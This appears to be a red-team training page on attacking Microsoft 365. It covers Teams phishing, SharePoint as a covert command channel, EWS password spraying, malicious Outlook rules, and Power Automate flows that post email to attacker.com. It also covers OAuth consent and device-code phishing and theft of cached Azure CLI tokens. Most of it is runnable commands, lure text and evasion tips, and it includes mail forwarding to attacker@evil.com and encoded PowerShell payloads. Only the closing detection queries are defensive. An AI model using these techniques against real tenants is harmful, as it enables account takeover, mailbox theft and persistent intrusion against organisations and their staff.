---
layout: training-page
title: "Microsoft 365 Attacks — Red Team Academy"
module: "Active Directory"
tags: [m365, office365, teams, sharepoint, exchange, power-automate, graph-api]
page_key: "active-directory-m365-attacks"
render_with_liquid: false
updated: "2026-04-17"
---

# Microsoft 365 Attacks

## Overview

Microsoft 365 attacks operate at the application layer on top of Azure AD/Entra ID identity. While Azure AD attacks target the identity plane (tokens, roles, Conditional Access), M365 attacks exploit the productivity applications themselves — Teams, SharePoint, Exchange Online, Power Platform, and the Graph API surface that ties them together. Many organizations harden Azure AD but leave M365 applications with permissive defaults. The result is a rich attack surface for lateral movement, data exfiltration, and persistence that rarely triggers traditional endpoint security.

Key distinction from Azure AD attacks: Azure AD attacks compromise identity. M365 attacks exploit authenticated access to applications — often using legitimately obtained tokens with no privilege escalation required.

Attack surface includes:
- Microsoft Teams (phishing, malicious tabs, external message delivery)
- SharePoint Online (C2 channels, staging exfil, malicious documents)
- Exchange Online / Outlook (EWS abuse, forwarding rules, mailbox enumeration)
- Power Platform (Power Automate flows, Canvas app phishing)
- Microsoft Graph API (OAuth consent abuse, device code phishing, data enumeration)

## M365 Attack Surface Overview

```
# M365 services and their attack relevance:

# Teams        — 300M+ daily active users
#               Accepts messages from external tenants by default
#               Allows file sharing, tab injection, bot webhooks
#               No user-facing cert warnings for Teams phishing

# SharePoint   — File storage and collaboration
#               REST API + SOAP (EWS-equivalent) for covert comms
#               Document libraries accessible via Graph
#               Default permission: authenticated users can create sites

# Exchange     — Email, calendar, contacts
#               EWS (legacy SOAP API) and Graph Mail endpoints
#               OAB (Offline Address Book) exposes full GAL
#               Outlook rules execute on server-side (no client needed)

# Power Platform — Low-code/no-code automation
#               Power Automate can trigger on email, files, webhooks
#               HTTP connector sends data to arbitrary external URLs
#               Canvas apps can mimic any corporate application

# Graph API    — Single interface to all above services
#               OAuth-scoped access tokens grant granular permissions
#               Accessible from any internet-connected attacker host

# Enumerate which services are licensed:
Get-MsolAccountSku                     # Legacy MSOL — lists licensed service plans
az ad sp list --all --query "[?contains(displayName,'Microsoft')] | [].displayName"
# Or enumerate via Graph:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/subscribedSkus" | python3 -m json.tool
```

## Teams Phishing — External Tenant Message Delivery

Microsoft Teams allows external tenants to message internal users by default. This creates a direct phishing channel that bypasses email security gateways (SEGs), phishing filters, and DMARC/DKIM/SPF controls. Teams messages arrive with the attacker's legitimate Microsoft-verified identity and no visual warning distinguishing external from internal messages.

```
# External Teams message delivery:
# 1. Attacker creates or compromises a Microsoft 365 tenant
# 2. Navigates to Teams → New Chat → enter victim's full UPN (user@corp.com)
# 3. Teams prompts: "Send message to external user" — sends directly
# 4. Victim receives message in Teams with no phishing warning

# TeamsPhisher — automated Teams external message delivery:
# https://github.com/Octoberfest7/TeamsPhisher
git clone https://github.com/Octoberfest7/TeamsPhisher
cd TeamsPhisher

# Send phishing message with attachment link to all users from a list:
python3 TeamsPhisher.py \
  --username attacker@evilcorp.onmicrosoft.com \
  --password 'P@ssw0rd!' \
  --message "Your IT team needs you to review this urgent security update." \
  --url "https://attacker.com/payload.html" \
  --users targets.txt \
  --delay 5

# Targets file format (one UPN per line):
# ceo@targetcorp.com
# cfo@targetcorp.com
# admin@targetcorp.com

# GIFShell attack chain (CVE-2022-36427 context):
# Exploited Teams' GIF rendering mechanism to exfiltrate data
# via base64-encoded GIF filenames in Teams messages
# Attacker sends malicious stager → stager encodes C2 output into GIF filename
# Teams renders GIF → GIF fetch goes to attacker's server with encoded data
# Fully within legitimate Teams traffic — C2 via Microsoft's own CDN
# Tools: https://github.com/bobbyrsec/Microsoft-Teams-GIFShell

# Malicious tab injection:
# Teams allows adding tabs to channels — tabs are web apps rendered in iframes
# Any Teams Channel member with tab add permissions can inject a tab
# Malicious tab loads attacker-controlled page inside Teams client
# Bypasses CSP for Teams itself (tab is external URL rendered in Teams)
# Attack: gain access to Teams channel → add tab → link to credential harvester

# --- Check external access settings (as admin or via Graph) ---
# Graph API — read Teams tenant federation settings:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/admin/teams/teamsAppSettings"

# PowerShell (requires Teams admin):
Get-CsTenantFederationConfiguration | Select-Object AllowFederatedUsers,AllowTeamsConsumer
# AllowFederatedUsers: True = external org users can message internally
# AllowTeamsConsumer: True = personal Teams accounts can message internally
```

## SharePoint as a C2 Channel

SharePoint Online's REST API provides a covert communications channel that blends with legitimate Microsoft 365 traffic. C2 traffic originating from SharePoint looks identical to normal corporate file sync activity — same domain (*.sharepoint.com), same TLS certificate chain, same User-Agent patterns. Many CASB and DLP tools exempt SharePoint traffic.

```
# SharePoint REST API for covert C2:
# Concept: implant polls SharePoint document library for task files
#           implant uploads output to SharePoint as "results" files
#           C2 operator reads results via SharePoint API

# Authenticate to SharePoint (using stolen access token):
# Token scope: https://[tenant].sharepoint.com/.default

# List files in a document library:
curl -H "Authorization: Bearer $SHAREPOINT_TOKEN" \
  "https://[tenant].sharepoint.com/sites/[site]/_api/web/lists/getbytitle('Documents')/items" \
  -H "Accept: application/json;odata=neatjson"

# Download a task file (implant reads commands):
curl -H "Authorization: Bearer $SHAREPOINT_TOKEN" \
  "https://[tenant].sharepoint.com/sites/[site]/_api/web/GetFileByServerRelativePath(decodedurl='/sites/[site]/Shared Documents/task.txt')/\$value" \
  -o task.txt

# Upload output file (implant sends results):
curl -X POST \
  -H "Authorization: Bearer $SHAREPOINT_TOKEN" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @results.txt \
  "https://[tenant].sharepoint.com/sites/[site]/_api/web/GetFolderByServerRelativePath(decodedurl='/sites/[site]/Shared Documents')/Files/Add(url='results.txt',overwrite=true)"

# Stage exfil data in SharePoint before exfiltration:
# 1. Collect sensitive files from compromised endpoints
# 2. Upload to SharePoint under a benign-looking folder name
# 3. Exfil from SharePoint in one burst via bulk download
# Advantage: intermediate step in SharePoint avoids direct exfil detection

# SharePoint SOAP API (older but still functional):
# Used in older C2 frameworks (Office365 C2 via SharePoint SOAP)
# More detection-prone — prefer REST API approach

# OPSEC notes:
# - SharePoint access tokens are short-lived (60-90 min) — refresh regularly
# - Access logs in M365 Unified Audit Log (SharePoint item access events)
# - Use existing SharePoint sites; creating new ones is logged prominently
# - Randomize access intervals to match business hours patterns
```

## Exchange Web Services (EWS) Abuse

Exchange Web Services is a legacy SOAP API for Exchange Online. Despite Microsoft's push toward Graph Mail, EWS remains widely supported and enabled. It exposes mailbox enumeration, email harvesting, OAB/GAL access, and rule manipulation — all with a single set of credentials or an EWS-scoped access token.

```
# MailSniper — Exchange reconnaissance and email harvesting:
# https://github.com/dafthack/MailSniper
Import-Module MailSniper.ps1

# Enumerate valid users via EWS timing/error difference:
Invoke-UsernameHarvestEWS -ExchHostname mail.targetcorp.com \
  -UserList users.txt \
  -Threads 5 \
  -OutFile valid_users.txt

# Password spray via EWS:
Invoke-PasswordSprayEWS -ExchHostname mail.targetcorp.com \
  -UserList valid_users.txt \
  -Password "Spring2026!" \
  -Threads 5 \
  -OutFile sprayed_creds.txt

# Search mailboxes for sensitive keywords (requires credentials):
Invoke-SelfSearch -Mailbox victim@corp.com \
  -ExchHostname mail.targetcorp.com \
  -Terms "password","secret","vpn","api key" \
  -OutputCsv mailbox_search.csv

# Dump the Global Address List via OAB:
# OAB (Offline Address Book) exposes full directory without Graph permissions
Get-GlobalAddressList -ExchHostname outlook.office365.com \
  -UserName victim@corp.com \
  -Password 'P@ssw0rd!' \
  -OutFile gal.txt
# Returns: all email addresses, display names, departments, phone numbers

# EWS via raw SOAP request (manual enumeration):
# Check if EWS is accessible without auth (should return 401):
curl -s -o /dev/null -w "%{http_code}" \
  https://outlook.office365.com/EWS/Exchange.asmx

# List inbox via EWS SOAP API:
# POST to https://outlook.office365.com/EWS/Exchange.asmx
# With Authorization: Basic base64(user:pass) or Bearer token
# SOAP body: FindItem with AllProperties shape on WellKnownFolderName=inbox

# Graph Mail API alternative (preferred for stealth):
# Read inbox:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?\$top=25"

# Search mail for keywords:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$search=\"password\"&\$select=subject,bodyPreview,from"
```

## Outlook Rules for Persistence

Malicious Outlook rules execute automatically on the Exchange server when matching emails arrive. No client interaction is needed after rule creation — the rule runs server-side. This technique (popularized by the Ruler tool) enables persistent code execution that survives endpoint wipes, as rules are stored on Exchange Online.

```
# Ruler — Outlook rule manipulation via MAPI over HTTP:
# https://github.com/sensepost/ruler
git clone https://github.com/sensepost/ruler
cd ruler

# Brute-force / verify credentials:
./ruler --domain targetcorp.com brute --users users.txt --passwords passwords.txt

# List existing rules:
./ruler --domain targetcorp.com --username victim \
  --password 'P@ssw0rd!' --email victim@corp.com \
  rules list

# Create malicious rule — execute shell command when specific subject arrives:
./ruler --domain targetcorp.com --username victim \
  --password 'P@ssw0rd!' --email victim@corp.com \
  rules add \
  --name "SecurityAlert" \
  --trigger "Security Update Required" \
  --location "C:\Windows\System32\cmd.exe" \
  --args "/c powershell.exe -enc BASE64PAYLOAD"

# Trigger the rule — send email to victim with matching subject:
# Subject: "Security Update Required"
# → Exchange server-side rule fires → cmd.exe runs payload

# VBScript via Outlook forms (more advanced):
# Ruler also supports malicious Outlook HOME_PAGE forms
# Forms execute VBScript when the victim opens the affected folder
./ruler --domain targetcorp.com --username victim \
  --password 'P@ssw0rd!' --email victim@corp.com \
  homepage add \
  --url "http://attacker.com/malicious.html"

# Graph API approach — create rule via Graph (no Ruler needed with Graph token):
POST https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules
Content-Type: application/json
Authorization: Bearer TOKEN

{
  "displayName": "AutoArchive",
  "sequence": 1,
  "isEnabled": true,
  "conditions": {
    "subjectContains": ["Invoice"]
  },
  "actions": {
    "forwardTo": [{"emailAddress": {"address": "attacker@evil.com"}}],
    "stopProcessingRules": true
  }
}

# Rule-based email forwarding for ongoing collection:
# Forward all incoming mail containing "password" or "invoice" to attacker mailbox
# Survives password resets — rules are per-mailbox, not per-session
```

## Power Automate / Power Platform Abuse

Power Automate (formerly Flow) is a low-code automation platform included in most M365 licenses. Any authenticated user can create flows that trigger on M365 events (email received, file uploaded, scheduled) and perform actions (HTTP requests, SharePoint writes, Teams messages). Flows can exfiltrate data and establish C2 channels entirely within legitimate Microsoft infrastructure.

```
# Power Automate for data exfiltration:
# Scenario: Attacker with M365 user credentials creates a flow that:
#   1. Triggers when any email containing "password" arrives
#   2. Sends the email content to attacker's webhook

# Power Automate REST API — create a flow programmatically:
# First, get a token scoped to Power Automate:
# Resource: https://service.flow.microsoft.com/

# Enumerate existing flows (check for interesting automation):
curl -H "Authorization: Bearer $FLOW_TOKEN" \
  "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/~default/flows?api-version=2016-11-01"

# Flow JSON definition for email exfil (simplified):
# {
#   "properties": {
#     "definition": {
#       "triggers": {
#         "When_a_new_email_arrives": {
#           "type": "ApiConnection",
#           "inputs": { "host": { "connection": { "name": "shared_office365" } },
#             "method": "get", "path": "/v2/Mail/OnNewEmail" },
#           "recurrence": { "frequency": "Minute", "interval": 1 }
#         }
#       },
#       "actions": {
#         "HTTP": {
#           "type": "Http",
#           "inputs": {
#             "method": "POST",
#             "uri": "https://attacker.com/collect",
#             "body": "@{triggerOutputs()?['body']}"
#           }
#         }
#       }
#     }
#   }
# }

# Power Automate HTTP connector as C2:
# Scheduled flow polls attacker URL every minute for commands
# Executes Office 365 actions based on returned JSON
# Entirely within Microsoft infrastructure — hard to block

# Canvas Apps as phishing lures:
# Power Apps Canvas apps can mimic any corporate web application
# Share a Canvas app URL (apps.powerapps.com) with target users
# Users see a "legitimate" Microsoft app — actually a credential harvester
# Canvas apps have access to M365 connectors — if victim clicks Allow:
#   → Attacker gains OAuth token for victim's M365 data

# Enumerate Canvas apps in tenant:
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.powerapps.com/providers/Microsoft.PowerApps/apps?api-version=2016-11-01"

# Power Platform admin restrictions to look for (attacker perspective — check if open):
# DLP policies (Data Loss Prevention) — may block HTTP connector to external URLs
# Environment policies — may restrict who can create flows
# Connector restrictions — may whitelist only specific connectors
```

## Microsoft Graph API Attacks

The Graph API is the primary attack surface for M365 application-layer attacks. OAuth consent phishing, device code phishing, and direct Graph enumeration all operate through the same interface Microsoft uses legitimately. Tokens obtained via any method grant access to whatever Graph permissions were consented.

```
# OAuth App Consent Phishing (Illicit Consent Grant):
# Attacker registers a malicious app with high-value M365 Graph permissions
# Crafts a consent URL and phishes the victim to click "Accept"
# Attacker receives OAuth tokens scoped to victim's M365 data

# High-value M365 Graph scopes for consent phishing:
# Mail.ReadWrite            — read and write all email
# Files.ReadWrite.All       — full OneDrive + SharePoint access
# MailboxSettings.ReadWrite — modify mailbox settings (forwarding rules)
# Calendars.ReadWrite       — executive calendar access
# Chat.ReadWrite            — read all Teams messages
# TeamMember.ReadWrite.All  — add/remove Teams members

# Consent phishing URL:
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=MALICIOUS_APP_ID
  &response_type=code
  &redirect_uri=https://attacker.com/callback
  &scope=Mail.ReadWrite%20Files.ReadWrite.All%20Chat.Read%20offline_access
  &prompt=consent

# Device Code Phishing (bypasses MFA):
# Attacker initiates device code flow for Microsoft Graph
# Victim enters code at https://microsoft.com/devicelogin (looks fully legitimate)
# Attacker polls for tokens — receives access + refresh token after victim authenticates
# No credentials seen by attacker — works regardless of MFA

# Using AADInternals for device code phishing:
Import-Module AADInternals
$deviceCode = Invoke-AADIntDeviceCodeFlow -Resource "https://graph.microsoft.com"
# Returns: user_code (e.g., "ABCD-EFGH"), device_code, expires_in
# Attacker sends victim: "Please authenticate at https://microsoft.com/devicelogin
#   and enter code: ABCD-EFGH to complete your security verification."
# Attacker polls until victim authenticates:
$tokens = Get-AADIntAccessToken -DeviceCode $deviceCode

# Graph API enumeration with stolen token:
$TOKEN = $tokens.access_token

# Enumerate all users in tenant:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users?\$select=displayName,mail,jobTitle,department&\$top=999"

# Enumerate all Teams messages in a channel (Chat.Read scope):
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/teams/{team-id}/channels/{channel-id}/messages"

# Read all of victim's mail:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=50&\$orderby=receivedDateTime+desc"

# Search OneDrive for sensitive files:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/search(q='password')?\$select=name,webUrl,size"

# List SharePoint sites:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/sites?search=*"

# Enumerate all group memberships:
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/memberOf"

# Python script for bulk Graph enumeration:
import requests

TOKEN = "<stolen_token>"
headers = {"Authorization": f"Bearer {TOKEN}"}
base = "https://graph.microsoft.com/v1.0"

# Enumerate users with pagination:
url = f"{base}/users?$top=999"
while url:
    resp = requests.get(url, headers=headers).json()
    for user in resp.get("value", []):
        print(f"{user['displayName']}: {user.get('mail','')}")
    url = resp.get("@odata.nextLink")
```

## Azure CLI / Az PowerShell Token Harvesting

When operators or developers use Azure CLI or Azure PowerShell interactively, tokens are cached locally. These cached tokens include access tokens, refresh tokens, and in some cases Primary Refresh Token (PRT) derivatives. Compromising a developer's workstation yields cloud access tokens that are often valid for extended periods.

```
# Azure CLI token cache locations:
~/.azure/msal_token_cache.json          # Linux/macOS — primary token cache
~/.azure/azureProfile.json              # Subscription + tenant metadata
%USERPROFILE%\.azure\msal_token_cache.json   # Windows

# Azure PowerShell token cache:
%USERPROFILE%\.Azure\TokenCache.dat          # Legacy Az module cache
%USERPROFILE%\.Azure\AzureRmContext.json     # Context file with subscription info

# Extract and replay Azure CLI tokens:
# On compromised Linux system (e.g., developer workstation, build server, container):
cat ~/.azure/msal_token_cache.json | python3 -c "
import json,sys
data = json.load(sys.stdin)
for key, val in data.get('AccessToken', {}).items():
    print(f'Token: {val.get(\"secret\",\"\")[:80]}...')
    print(f'Target: {val.get(\"target\",\"\")}')
    print(f'Expires: {val.get(\"expires_on\",\"\")}')
    print()
"

# Replay stolen refresh token via Az CLI:
# On attacker machine:
az account get-access-token  # Fails without login
# Inject stolen msal_token_cache.json into ~/.azure/
# Then: az account get-access-token works with victim's identity

# Cloud environment token theft (e.g., GitHub Actions runner, Azure DevOps agent):
# Build agents running in cloud often have az login via service principal or managed identity
# Exfiltrate ~/.azure/ from build agent → get CI/CD service principal tokens

# Azure PowerShell token replay:
Connect-AzAccount -AccessToken $stolen_access_token -AccountId user@corp.com
# Note: access tokens expire in ~60-90min — prefer refresh tokens

# OPSEC: Token theft leaves minimal logs compared to interactive login
# Azure Sign-In logs show the original authentication, not subsequent token replays
```

## Detection: Microsoft Purview Audit Logs

Microsoft Purview (formerly Compliance Center) maintains the Unified Audit Log (UAL) for M365 activity. Understanding what is logged helps red team operators predict detection risk. Key logs: Exchange audit, SharePoint audit, Teams audit, Azure AD sign-in logs, and Power Platform activity.

```
# Unified Audit Log via PowerShell:
# Requires: Compliance Administrator or View-Only Audit Logs role
Connect-ExchangeOnline -UserPrincipalName admin@corp.com

# Search UAL for recent activity (last 24h):
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-1) \
  -EndDate (Get-Date) \
  -ResultSize 1000 | Format-Table CreationDate, UserIds, Operations, RecordType

# Filter by specific operations — EWS access:
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) \
  -EndDate (Get-Date) \
  -Operations "MailItemsAccessed" \
  -ResultSize 1000

# Filter for mail forwarding rules created:
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) \
  -EndDate (Get-Date) \
  -Operations "New-InboxRule","Set-InboxRule" \
  -ResultSize 500

# Filter for Teams external message events:
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) \
  -EndDate (Get-Date) \
  -RecordType MicrosoftTeams \
  -Operations "MessageCreatedHasLink" \
  -ResultSize 500

# Graph API alert rules — set via Security Graph:
POST https://graph.microsoft.com/v1.0/security/alerts
# Requires SecurityEvents.ReadWrite.All
# Can create alerts for: OAuth app consent, new mail rules, Teams external messages

# KQL in Microsoft Sentinel for M365 detections:

# Detect OAuth consent to high-risk permissions:
AuditLogs
| where OperationName == "Consent to application"
| extend Scopes = tostring(TargetResources[0].modifiedProperties)
| where Scopes has_any ("Mail.ReadWrite", "Files.ReadWrite.All", "Directory.ReadWrite")
| project TimeGenerated, InitiatedBy, Scopes

# Detect new inbox rules forwarding to external addresses:
OfficeActivity
| where Operation in ("New-InboxRule", "Set-InboxRule")
| where Parameters has "ForwardTo" or Parameters has "RedirectTo"
| extend ExternalDomain = extract(@"@([^>\"]+)", 1, Parameters)
| where ExternalDomain !endswith "targetcorp.com"

# Detect device code phishing (successful after pending):
AADSignInEventsBeta
| where AuthenticationProtocol == "deviceCode"
| where IsSuccess == true
| project Timestamp, UserPrincipalName, IPAddress, UserAgent, AppDisplayName
```
